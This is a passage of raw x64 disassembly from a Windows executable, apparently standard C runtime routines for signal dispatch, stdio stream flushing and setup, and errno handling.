   140005cc7:	33 c0                	xor    %eax,%eax
   140005cc9:	48 85 c0             	test   %rax,%rax
   140005ccc:	75 12                	jne    0x140005ce0
   140005cce:	e8 29 06 00 00       	call   0x1400062fc
   140005cd3:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140005cd9:	e8 f2 fb ff ff       	call   0x1400058d0
   140005cde:	eb ae                	jmp    0x140005c8e
   140005ce0:	48 8d 78 08          	lea    0x8(%rax),%rdi
   140005ce4:	45 32 f6             	xor    %r14b,%r14b
   140005ce7:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   140005cec:	eb 22                	jmp    0x140005d10
   140005cee:	48 8d 3d 43 2e 01 00 	lea    0x12e43(%rip),%rdi        # 0x140018b38
   140005cf5:	eb 19                	jmp    0x140005d10
   140005cf7:	48 8d 3d 32 2e 01 00 	lea    0x12e32(%rip),%rdi        # 0x140018b30
   140005cfe:	eb 10                	jmp    0x140005d10
   140005d00:	48 8d 3d 39 2e 01 00 	lea    0x12e39(%rip),%rdi        # 0x140018b40
   140005d07:	eb 07                	jmp    0x140005d10
   140005d09:	48 8d 3d 18 2e 01 00 	lea    0x12e18(%rip),%rdi        # 0x140018b28
   140005d10:	48 83 a4 24 80 00 00 	andq   $0x0,0x80(%rsp)
   140005d17:	00 00 
   140005d19:	45 84 f6             	test   %r14b,%r14b
   140005d1c:	74 0b                	je     0x140005d29
   140005d1e:	b9 03 00 00 00       	mov    $0x3,%ecx
   140005d23:	e8 b8 e6 ff ff       	call   0x1400043e0
   140005d28:	90                   	nop
   140005d29:	48 8b 37             	mov    (%rdi),%rsi
   140005d2c:	45 84 f6             	test   %r14b,%r14b
   140005d2f:	74 12                	je     0x140005d43
   140005d31:	48 8b 05 00 13 01 00 	mov    0x11300(%rip),%rax        # 0x140017038
   140005d38:	8b c8                	mov    %eax,%ecx
   140005d3a:	83 e1 3f             	and    $0x3f,%ecx
   140005d3d:	48 33 f0             	xor    %rax,%rsi
   140005d40:	48 d3 ce             	ror    %cl,%rsi
   140005d43:	48 83 fe 01          	cmp    $0x1,%rsi
   140005d47:	0f 84 94 00 00 00    	je     0x140005de1
   140005d4d:	48 85 f6             	test   %rsi,%rsi
   140005d50:	0f 84 03 01 00 00    	je     0x140005e59
   140005d56:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   140005d5c:	83 fb 0b             	cmp    $0xb,%ebx
   140005d5f:	77 3d                	ja     0x140005d9e
   140005d61:	41 0f a3 dc          	bt     %ebx,%r12d
   140005d65:	73 37                	jae    0x140005d9e
   140005d67:	49 8b 45 08          	mov    0x8(%r13),%rax
   140005d6b:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140005d72:	00 
   140005d73:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005d78:	49 83 65 08 00       	andq   $0x0,0x8(%r13)
   140005d7d:	83 fb 08             	cmp    $0x8,%ebx
   140005d80:	75 53                	jne    0x140005dd5
   140005d82:	e8 19 e7 ff ff       	call   0x1400044a0
   140005d87:	8b 40 10             	mov    0x10(%rax),%eax
   140005d8a:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140005d8e:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140005d92:	e8 09 e7 ff ff       	call   0x1400044a0
   140005d97:	c7 40 10 8c 00 00 00 	movl   $0x8c,0x10(%rax)
   140005d9e:	83 fb 08             	cmp    $0x8,%ebx
   140005da1:	75 32                	jne    0x140005dd5
   140005da3:	48 8b 05 8e 85 00 00 	mov    0x858e(%rip),%rax        # 0x14000e338
   140005daa:	48 c1 e0 04          	shl    $0x4,%rax
   140005dae:	49 03 45 00          	add    0x0(%r13),%rax
   140005db2:	48 8b 0d 87 85 00 00 	mov    0x8587(%rip),%rcx        # 0x14000e340
   140005db9:	48 c1 e1 04          	shl    $0x4,%rcx
   140005dbd:	48 03 c8             	add    %rax,%rcx
   140005dc0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005dc5:	48 3b c1             	cmp    %rcx,%rax
   140005dc8:	74 1d                	je     0x140005de7
   140005dca:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   140005dcf:	48 83 c0 10          	add    $0x10,%rax
   140005dd3:	eb eb                	jmp    0x140005dc0
   140005dd5:	48 8b 05 5c 12 01 00 	mov    0x1125c(%rip),%rax        # 0x140017038
   140005ddc:	48 89 07             	mov    %rax,(%rdi)
   140005ddf:	eb 06                	jmp    0x140005de7
   140005de1:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   140005de7:	45 84 f6             	test   %r14b,%r14b
   140005dea:	74 0a                	je     0x140005df6
   140005dec:	b9 03 00 00 00       	mov    $0x3,%ecx
   140005df1:	e8 06 e6 ff ff       	call   0x1400043fc
   140005df6:	48 83 fe 01          	cmp    $0x1,%rsi
   140005dfa:	75 07                	jne    0x140005e03
   140005dfc:	33 c0                	xor    %eax,%eax
   140005dfe:	e9 8e fe ff ff       	jmp    0x140005c91
   140005e03:	83 fb 08             	cmp    $0x8,%ebx
   140005e06:	75 19                	jne    0x140005e21
   140005e08:	e8 93 e6 ff ff       	call   0x1400044a0
   140005e0d:	8b 50 10             	mov    0x10(%rax),%edx
   140005e10:	8b cb                	mov    %ebx,%ecx
   140005e12:	48 8b c6             	mov    %rsi,%rax
   140005e15:	4c 8b 05 f4 41 01 00 	mov    0x141f4(%rip),%r8        # 0x14001a010
   140005e1c:	41 ff d0             	call   *%r8
   140005e1f:	eb 0e                	jmp    0x140005e2f
   140005e21:	8b cb                	mov    %ebx,%ecx
   140005e23:	48 8b c6             	mov    %rsi,%rax
   140005e26:	48 8b 15 e3 41 01 00 	mov    0x141e3(%rip),%rdx        # 0x14001a010
   140005e2d:	ff d2                	call   *%rdx
   140005e2f:	83 fb 0b             	cmp    $0xb,%ebx
   140005e32:	77 c8                	ja     0x140005dfc
   140005e34:	41 0f a3 dc          	bt     %ebx,%r12d
   140005e38:	73 c2                	jae    0x140005dfc
   140005e3a:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140005e41:	00 
   140005e42:	49 89 45 08          	mov    %rax,0x8(%r13)
   140005e46:	83 fb 08             	cmp    $0x8,%ebx
   140005e49:	75 b1                	jne    0x140005dfc
   140005e4b:	e8 50 e6 ff ff       	call   0x1400044a0
   140005e50:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140005e54:	89 48 10             	mov    %ecx,0x10(%rax)
   140005e57:	eb a3                	jmp    0x140005dfc
   140005e59:	45 84 f6             	test   %r14b,%r14b
   140005e5c:	74 08                	je     0x140005e66
   140005e5e:	8d 4e 03             	lea    0x3(%rsi),%ecx
   140005e61:	e8 96 e5 ff ff       	call   0x1400043fc
   140005e66:	b9 03 00 00 00       	mov    $0x3,%ecx
   140005e6b:	e8 94 c8 ff ff       	call   0x140002704
   140005e70:	90                   	nop
   140005e71:	cc                   	int3
   140005e72:	cc                   	int3
   140005e73:	cc                   	int3
   140005e74:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005e79:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140005e7e:	57                   	push   %rdi
   140005e7f:	48 83 ec 20          	sub    $0x20,%rsp
   140005e83:	49 8b f9             	mov    %r9,%rdi
   140005e86:	8b 0a                	mov    (%rdx),%ecx
   140005e88:	e8 53 e5 ff ff       	call   0x1400043e0
   140005e8d:	90                   	nop
   140005e8e:	48 8b 1d a3 11 01 00 	mov    0x111a3(%rip),%rbx        # 0x140017038
   140005e95:	8b cb                	mov    %ebx,%ecx
   140005e97:	83 e1 3f             	and    $0x3f,%ecx
   140005e9a:	48 33 1d 97 2c 01 00 	xor    0x12c97(%rip),%rbx        # 0x140018b38
   140005ea1:	48 d3 cb             	ror    %cl,%rbx
   140005ea4:	8b 0f                	mov    (%rdi),%ecx
   140005ea6:	e8 51 e5 ff ff       	call   0x1400043fc
   140005eab:	48 8b c3             	mov    %rbx,%rax
   140005eae:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005eb3:	48 83 c4 20          	add    $0x20,%rsp
   140005eb7:	5f                   	pop    %rdi
   140005eb8:	c3                   	ret
   140005eb9:	cc                   	int3
   140005eba:	cc                   	int3
   140005ebb:	cc                   	int3
   140005ebc:	b1 01                	mov    $0x1,%cl
   140005ebe:	e9 c9 00 00 00       	jmp    0x140005f8c
   140005ec3:	cc                   	int3
   140005ec4:	40 53                	rex push %rbx
   140005ec6:	48 83 ec 20          	sub    $0x20,%rsp
   140005eca:	48 8b d9             	mov    %rcx,%rbx
   140005ecd:	48 85 c9             	test   %rcx,%rcx
   140005ed0:	75 0a                	jne    0x140005edc
   140005ed2:	48 83 c4 20          	add    $0x20,%rsp
   140005ed6:	5b                   	pop    %rbx
   140005ed7:	e9 b0 00 00 00       	jmp    0x140005f8c
   140005edc:	e8 2f 00 00 00       	call   0x140005f10
   140005ee1:	85 c0                	test   %eax,%eax
   140005ee3:	75 21                	jne    0x140005f06
   140005ee5:	8b 43 14             	mov    0x14(%rbx),%eax
   140005ee8:	c1 e8 0b             	shr    $0xb,%eax
   140005eeb:	a8 01                	test   $0x1,%al
   140005eed:	74 13                	je     0x140005f02
   140005eef:	48 8b cb             	mov    %rbx,%rcx
   140005ef2:	e8 fd 42 00 00       	call   0x14000a1f4
   140005ef7:	8b c8                	mov    %eax,%ecx
   140005ef9:	e8 8a 35 00 00       	call   0x140009488
   140005efe:	85 c0                	test   %eax,%eax
   140005f00:	75 04                	jne    0x140005f06
   140005f02:	33 c0                	xor    %eax,%eax
   140005f04:	eb 03                	jmp    0x140005f09
   140005f06:	83 c8 ff             	or     $0xffffffff,%eax
   140005f09:	48 83 c4 20          	add    $0x20,%rsp
   140005f0d:	5b                   	pop    %rbx
   140005f0e:	c3                   	ret
   140005f0f:	cc                   	int3
   140005f10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005f15:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005f1a:	57                   	push   %rdi
   140005f1b:	48 83 ec 20          	sub    $0x20,%rsp
   140005f1f:	48 8b d9             	mov    %rcx,%rbx
   140005f22:	8b 49 14             	mov    0x14(%rcx),%ecx
   140005f25:	8b c1                	mov    %ecx,%eax
   140005f27:	24 03                	and    $0x3,%al
   140005f29:	3c 02                	cmp    $0x2,%al
   140005f2b:	75 4b                	jne    0x140005f78
   140005f2d:	f6 c1 c0             	test   $0xc0,%cl
   140005f30:	74 46                	je     0x140005f78
   140005f32:	8b 3b                	mov    (%rbx),%edi
   140005f34:	2b 7b 08             	sub    0x8(%rbx),%edi
   140005f37:	83 63 10 00          	andl   $0x0,0x10(%rbx)
   140005f3b:	48 8b 73 08          	mov    0x8(%rbx),%rsi
   140005f3f:	48 89 33             	mov    %rsi,(%rbx)
   140005f42:	85 ff                	test   %edi,%edi
   140005f44:	7e 32                	jle    0x140005f78
   140005f46:	48 8b cb             	mov    %rbx,%rcx
   140005f49:	e8 a6 42 00 00       	call   0x14000a1f4
   140005f4e:	8b c8                	mov    %eax,%ecx
   140005f50:	44 8b c7             	mov    %edi,%r8d
   140005f53:	48 8b d6             	mov    %rsi,%rdx
   140005f56:	e8 4d 36 00 00       	call   0x1400095a8
   140005f5b:	3b f8                	cmp    %eax,%edi
   140005f5d:	74 0a                	je     0x140005f69
   140005f5f:	f0 83 4b 14 10       	lock orl $0x10,0x14(%rbx)
   140005f64:	83 c8 ff             	or     $0xffffffff,%eax
   140005f67:	eb 11                	jmp    0x140005f7a
   140005f69:	8b 43 14             	mov    0x14(%rbx),%eax
   140005f6c:	c1 e8 02             	shr    $0x2,%eax
   140005f6f:	a8 01                	test   $0x1,%al
   140005f71:	74 05                	je     0x140005f78
   140005f73:	f0 83 63 14 fd       	lock andl $0xfffffffd,0x14(%rbx)
   140005f78:	33 c0                	xor    %eax,%eax
   140005f7a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005f7f:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140005f84:	48 83 c4 20          	add    $0x20,%rsp
   140005f88:	5f                   	pop    %rdi
   140005f89:	c3                   	ret
   140005f8a:	cc                   	int3
   140005f8b:	cc                   	int3
   140005f8c:	88 4c 24 08          	mov    %cl,0x8(%rsp)
   140005f90:	55                   	push   %rbp
   140005f91:	48 8b ec             	mov    %rsp,%rbp
   140005f94:	48 83 ec 40          	sub    $0x40,%rsp
   140005f98:	83 65 28 00          	andl   $0x0,0x28(%rbp)
   140005f9c:	48 8d 45 28          	lea    0x28(%rbp),%rax
   140005fa0:	83 65 20 00          	andl   $0x0,0x20(%rbp)
   140005fa4:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140005fa8:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140005fac:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140005fb0:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140005fb4:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140005fb8:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   140005fbc:	48 8d 45 20          	lea    0x20(%rbp),%rax
   140005fc0:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140005fc4:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005fc8:	b8 08 00 00 00       	mov    $0x8,%eax
   140005fcd:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140005fd0:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   140005fd3:	e8 b0 00 00 00       	call   0x140006088
   140005fd8:	80 7d 10 00          	cmpb   $0x0,0x10(%rbp)
   140005fdc:	8b 45 20             	mov    0x20(%rbp),%eax
   140005fdf:	0f 45 45 28          	cmovne 0x28(%rbp),%eax
   140005fe3:	48 83 c4 40          	add    $0x40,%rsp
   140005fe7:	5d                   	pop    %rbp
   140005fe8:	c3                   	ret
   140005fe9:	cc                   	int3
   140005fea:	cc                   	int3
   140005feb:	cc                   	int3
   140005fec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005ff1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140005ff6:	57                   	push   %rdi
   140005ff7:	48 83 ec 20          	sub    $0x20,%rsp
   140005ffb:	49 8b f9             	mov    %r9,%rdi
   140005ffe:	49 8b d8             	mov    %r8,%rbx
   140006001:	48 8b 0a             	mov    (%rdx),%rcx
   140006004:	e8 5f 01 00 00       	call   0x140006168
   140006009:	90                   	nop
   14000600a:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   14000600e:	48 8b 03             	mov    (%rbx),%rax
   140006011:	48 8b 00             	mov    (%rax),%rax
   140006014:	48 85 c0             	test   %rax,%rax
   140006017:	74 5a                	je     0x140006073
   140006019:	8b 48 14             	mov    0x14(%rax),%ecx
   14000601c:	8b c1                	mov    %ecx,%eax
   14000601e:	c1 e8 0d             	shr    $0xd,%eax
   140006021:	a8 01                	test   $0x1,%al
   140006023:	74 4e                	je     0x140006073
   140006025:	8b c1                	mov    %ecx,%eax
   140006027:	24 03                	and    $0x3,%al
   140006029:	3c 02                	cmp    $0x2,%al
   14000602b:	75 05                	jne    0x140006032
   14000602d:	f6 c1 c0             	test   $0xc0,%cl
   140006030:	75 0a                	jne    0x14000603c
   140006032:	0f ba e1 0b          	bt     $0xb,%ecx
   140006036:	72 04                	jb     0x14000603c
   140006038:	ff 02                	incl   (%rdx)
   14000603a:	eb 37                	jmp    0x140006073
   14000603c:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140006040:	80 38 00             	cmpb   $0x0,(%rax)
   140006043:	75 0f                	jne    0x140006054
   140006045:	48 8b 03             	mov    (%rbx),%rax
   140006048:	48 8b 08             	mov    (%rax),%rcx
   14000604b:	8b 41 14             	mov    0x14(%rcx),%eax
   14000604e:	d1 e8                	shr    $1,%eax
   140006050:	a8 01                	test   $0x1,%al
   140006052:	74 1f                	je     0x140006073
   140006054:	48 8b 03             	mov    (%rbx),%rax
   140006057:	48 8b 08             	mov    (%rax),%rcx
   14000605a:	e8 65 fe ff ff       	call   0x140005ec4
   14000605f:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006062:	74 08                	je     0x14000606c
   140006064:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140006068:	ff 00                	incl   (%rax)
   14000606a:	eb 07                	jmp    0x140006073
   14000606c:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140006070:	83 08 ff             	orl    $0xffffffff,(%rax)
   140006073:	48 8b 0f             	mov    (%rdi),%rcx
   140006076:	e8 f9 00 00 00       	call   0x140006174
   14000607b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006080:	48 83 c4 20          	add    $0x20,%rsp
   140006084:	5f                   	pop    %rdi
   140006085:	c3                   	ret
   140006086:	cc                   	int3
   140006087:	cc                   	int3
   140006088:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000608d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006092:	56                   	push   %rsi
   140006093:	57                   	push   %rdi
   140006094:	41 56                	push   %r14
   140006096:	48 83 ec 60          	sub    $0x60,%rsp
   14000609a:	49 8b f1             	mov    %r9,%rsi
   14000609d:	49 8b f8             	mov    %r8,%rdi
   1400060a0:	8b 0a                	mov    (%rdx),%ecx
   1400060a2:	e8 39 e3 ff ff       	call   0x1400043e0
   1400060a7:	90                   	nop
   1400060a8:	48 8b 1d a9 2a 01 00 	mov    0x12aa9(%rip),%rbx        # 0x140018b58
   1400060af:	48 63 05 9a 2a 01 00 	movslq 0x12a9a(%rip),%rax        # 0x140018b50
   1400060b6:	4c 8d 34 c3          	lea    (%rbx,%rax,8),%r14
   1400060ba:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400060bf:	49 3b de             	cmp    %r14,%rbx
   1400060c2:	0f 84 88 00 00 00    	je     0x140006150
   1400060c8:	48 8b 03             	mov    (%rbx),%rax
   1400060cb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400060d0:	48 8b 17             	mov    (%rdi),%rdx
   1400060d3:	48 85 c0             	test   %rax,%rax
   1400060d6:	74 21                	je     0x1400060f9
   1400060d8:	8b 48 14             	mov    0x14(%rax),%ecx
   1400060db:	8b c1                	mov    %ecx,%eax
   1400060dd:	c1 e8 0d             	shr    $0xd,%eax
   1400060e0:	a8 01                	test   $0x1,%al
   1400060e2:	74 15                	je     0x1400060f9
   1400060e4:	8b c1                	mov    %ecx,%eax
   1400060e6:	24 03                	and    $0x3,%al
   1400060e8:	3c 02                	cmp    $0x2,%al
   1400060ea:	75 05                	jne    0x1400060f1
   1400060ec:	f6 c1 c0             	test   $0xc0,%cl
   1400060ef:	75 0e                	jne    0x1400060ff
   1400060f1:	0f ba e1 0b          	bt     $0xb,%ecx
   1400060f5:	72 08                	jb     0x1400060ff
   1400060f7:	ff 02                	incl   (%rdx)
   1400060f9:	48 83 c3 08          	add    $0x8,%rbx
   1400060fd:	eb bb                	jmp    0x1400060ba
   1400060ff:	48 8b 57 10          	mov    0x10(%rdi),%rdx
   140006103:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140006107:	48 8b 07             	mov    (%rdi),%rax
   14000610a:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000610f:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   140006114:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140006119:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   14000611e:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   140006123:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140006128:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000612d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006132:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   140006137:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   14000613c:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140006141:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   140006148:	00 
   140006149:	e8 9e fe ff ff       	call   0x140005fec
   14000614e:	eb a9                	jmp    0x1400060f9
   140006150:	8b 0e                	mov    (%rsi),%ecx
   140006152:	e8 a5 e2 ff ff       	call   0x1400043fc
   140006157:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   14000615e:	00 
   14000615f:	48 83 c4 60          	add    $0x60,%rsp
   140006163:	41 5e                	pop    %r14
   140006165:	5f                   	pop    %rdi
   140006166:	5e                   	pop    %rsi
   140006167:	c3                   	ret
   140006168:	48 83 c1 30          	add    $0x30,%rcx
   14000616c:	48 ff 25 fd f5 00 00 	rex.W jmp *0xf5fd(%rip)        # 0x140015770
   140006173:	cc                   	int3
   140006174:	48 83 c1 30          	add    $0x30,%rcx
   140006178:	48 ff 25 31 f7 00 00 	rex.W jmp *0xf731(%rip)        # 0x1400158b0
   14000617f:	cc                   	int3
   140006180:	48 8b c4             	mov    %rsp,%rax
   140006183:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140006187:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000618b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000618f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140006193:	41 56                	push   %r14
   140006195:	48 83 ec 20          	sub    $0x20,%rsp
   140006199:	8b 05 b1 29 01 00    	mov    0x129b1(%rip),%eax        # 0x140018b50
   14000619f:	33 db                	xor    %ebx,%ebx
   1400061a1:	bf 03 00 00 00       	mov    $0x3,%edi
   1400061a6:	85 c0                	test   %eax,%eax
   1400061a8:	75 07                	jne    0x1400061b1
   1400061aa:	b8 00 02 00 00       	mov    $0x200,%eax
   1400061af:	eb 05                	jmp    0x1400061b6
   1400061b1:	3b c7                	cmp    %edi,%eax
   1400061b3:	0f 4c c7             	cmovl  %edi,%eax
   1400061b6:	48 63 c8             	movslq %eax,%rcx
   1400061b9:	ba 08 00 00 00       	mov    $0x8,%edx
   1400061be:	89 05 8c 29 01 00    	mov    %eax,0x1298c(%rip)        # 0x140018b50
   1400061c4:	e8 4f 05 00 00       	call   0x140006718
   1400061c9:	33 c9                	xor    %ecx,%ecx
   1400061cb:	48 89 05 86 29 01 00 	mov    %rax,0x12986(%rip)        # 0x140018b58
   1400061d2:	e8 fd f5 ff ff       	call   0x1400057d4
   1400061d7:	48 39 1d 7a 29 01 00 	cmp    %rbx,0x1297a(%rip)        # 0x140018b58
   1400061de:	75 2f                	jne    0x14000620f
   1400061e0:	ba 08 00 00 00       	mov    $0x8,%edx
   1400061e5:	89 3d 65 29 01 00    	mov    %edi,0x12965(%rip)        # 0x140018b50
   1400061eb:	48 8b cf             	mov    %rdi,%rcx
   1400061ee:	e8 25 05 00 00       	call   0x140006718
   1400061f3:	33 c9                	xor    %ecx,%ecx
   1400061f5:	48 89 05 5c 29 01 00 	mov    %rax,0x1295c(%rip)        # 0x140018b58
   1400061fc:	e8 d3 f5 ff ff       	call   0x1400057d4
   140006201:	48 39 1d 50 29 01 00 	cmp    %rbx,0x12950(%rip)        # 0x140018b58
   140006208:	75 05                	jne    0x14000620f
   14000620a:	83 c8 ff             	or     $0xffffffff,%eax
   14000620d:	eb 75                	jmp    0x140006284
   14000620f:	48 8b eb             	mov    %rbx,%rbp
   140006212:	48 8d 35 1f 15 01 00 	lea    0x1151f(%rip),%rsi        # 0x140017738
   140006219:	4c 8d 35 00 15 01 00 	lea    0x11500(%rip),%r14        # 0x140017720
   140006220:	49 8d 4e 30          	lea    0x30(%r14),%rcx
   140006224:	45 33 c0             	xor    %r8d,%r8d
   140006227:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   14000622c:	e8 77 dd ff ff       	call   0x140003fa8
   140006231:	48 8b 05 20 29 01 00 	mov    0x12920(%rip),%rax        # 0x140018b58
   140006238:	4c 8d 05 b1 24 01 00 	lea    0x124b1(%rip),%r8        # 0x1400186f0
   14000623f:	48 8b d5             	mov    %rbp,%rdx
   140006242:	48 c1 fa 06          	sar    $0x6,%rdx
   140006246:	4c 89 34 03          	mov    %r14,(%rbx,%rax,1)
   14000624a:	48 8b c5             	mov    %rbp,%rax
   14000624d:	83 e0 3f             	and    $0x3f,%eax
   140006250:	48 8d 0c c0          	lea    (%rax,%rax,8),%rcx
   140006254:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   140006258:	48 8b 4c c8 28       	mov    0x28(%rax,%rcx,8),%rcx
   14000625d:	48 83 c1 02          	add    $0x2,%rcx
   140006261:	48 83 f9 02          	cmp    $0x2,%rcx
   140006265:	77 06                	ja     0x14000626d
   140006267:	c7 06 fe ff ff ff    	movl   $0xfffffffe,(%rsi)
   14000626d:	48 ff c5             	inc    %rbp
   140006270:	49 83 c6 58          	add    $0x58,%r14
   140006274:	48 83 c3 08          	add    $0x8,%rbx
   140006278:	48 83 c6 58          	add    $0x58,%rsi
   14000627c:	48 83 ef 01          	sub    $0x1,%rdi
   140006280:	75 9e                	jne    0x140006220
   140006282:	33 c0                	xor    %eax,%eax
   140006284:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006289:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000628e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006293:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140006298:	48 83 c4 20          	add    $0x20,%rsp
   14000629c:	41 5e                	pop    %r14
   14000629e:	c3                   	ret
   14000629f:	cc                   	int3
   1400062a0:	40 53                	rex push %rbx
   1400062a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400062a6:	e8 11 fc ff ff       	call   0x140005ebc
   1400062ab:	e8 6c 3f 00 00       	call   0x14000a21c
   1400062b0:	33 db                	xor    %ebx,%ebx
   1400062b2:	48 8b 0d 9f 28 01 00 	mov    0x1289f(%rip),%rcx        # 0x140018b58
   1400062b9:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
   1400062bd:	e8 0e 40 00 00       	call   0x14000a2d0
   1400062c2:	48 8b 05 8f 28 01 00 	mov    0x1288f(%rip),%rax        # 0x140018b58
   1400062c9:	48 8b 0c 03          	mov    (%rbx,%rax,1),%rcx
   1400062cd:	48 83 c1 30          	add    $0x30,%rcx
   1400062d1:	ff 15 91 f4 00 00    	call   *0xf491(%rip)        # 0x140015768
   1400062d7:	48 83 c3 08          	add    $0x8,%rbx
   1400062db:	48 83 fb 18          	cmp    $0x18,%rbx
   1400062df:	75 d1                	jne    0x1400062b2
   1400062e1:	48 8b 0d 70 28 01 00 	mov    0x12870(%rip),%rcx        # 0x140018b58
   1400062e8:	e8 e7 f4 ff ff       	call   0x1400057d4
   1400062ed:	48 83 25 63 28 01 00 	andq   $0x0,0x12863(%rip)        # 0x140018b58
   1400062f4:	00 
   1400062f5:	48 83 c4 20          	add    $0x20,%rsp
   1400062f9:	5b                   	pop    %rbx
   1400062fa:	c3                   	ret
   1400062fb:	cc                   	int3
   1400062fc:	48 83 ec 28          	sub    $0x28,%rsp
   140006300:	e8 17 e3 ff ff       	call   0x14000461c
   140006305:	48 85 c0             	test   %rax,%rax
   140006308:	75 09                	jne    0x140006313
   14000630a:	48 8d 05 17 15 01 00 	lea    0x11517(%rip),%rax        # 0x140017828
   140006311:	eb 04                	jmp    0x140006317
   140006313:	48 83 c0 20          	add    $0x20,%rax
   140006317:	48 83 c4 28          	add    $0x28,%rsp
   14000631b:	c3                   	ret
   14000631c:	48 83 ec 28          	sub    $0x28,%rsp
   140006320:	e8 f7 e2 ff ff       	call   0x14000461c
   140006325:	48 85 c0             	test   %rax,%rax
   140006328:	75 09                	jne    0x140006333
   14000632a:	48 8d 05 fb 14 01 00 	lea    0x114fb(%rip),%rax        # 0x14001782c
   140006331:	eb 04                	jmp    0x140006337
   140006333:	48 83 c0 24          	add    $0x24,%rax
   140006337:	48 83 c4 28          	add    $0x28,%rsp
   14000633b:	c3                   	ret
   14000633c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006341:	57                   	push   %rdi
   140006342:	48 83 ec 20          	sub    $0x20,%rsp
   140006346:	8b f9                	mov    %ecx,%edi
   140006348:	e8 cf e2 ff ff       	call   0x14000461c
   14000634d:	48 85 c0             	test   %rax,%rax
   140006350:	75 09                	jne    0x14000635b
   140006352:	48 8d 05 d3 14 01 00 	lea    0x114d3(%rip),%rax        # 0x14001782c
   140006359:	eb 04                	jmp    0x14000635f
   14000635b:	48 83 c0 24          	add    $0x24,%rax
   14000635f:	89 38                	mov    %edi,(%rax)
   140006361:	e8 b6 e2 ff ff       	call   0x14000461c
   140006366:	48 8d 1d bb 14 01 00 	lea    0x114bb(%rip),%rbx        # 0x140017828
   14000636d:	48 85 c0             	test   %rax,%rax
   140006370:	74 04                	je     0x140006376
   140006372:	48 8d 58 20          	lea    0x20(%rax),%rbx
   140006376:	8b cf                	mov    %edi,%ecx
   140006378:	e8 0f 00 00 00       	call   0x14000638c
   14000637d:	89 03                	mov    %eax,(%rbx)
   14000637f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006384:	48 83 c4 20          	add    $0x20,%rsp
   140006388:	5f                   	pop    %rdi
   140006389:	c3                   	ret
   14000638a:	cc                   	int3
   14000638b:	cc                   	int3
   14000638c:	33 c0                	xor    %eax,%eax
   14000638e:	4c 8d 0d 8b 8a 00 00 	lea    0x8a8b(%rip),%r9        # 0x14000ee20
   140006395:	49 8b d1             	mov    %r9,%rdx
   140006398:	44 8d 40 08          	lea    0x8(%rax),%r8d
   14000639c:	3b 0a                	cmp    (%rdx),%ecx
   14000639e:	74 2b                	je     0x1400063cb
   1400063a0:	ff c0                	inc    %eax
   1400063a2:	49 03 d0             	add    %r8,%rdx
   1400063a5:	83 f8 2d             	cmp    $0x2d,%eax
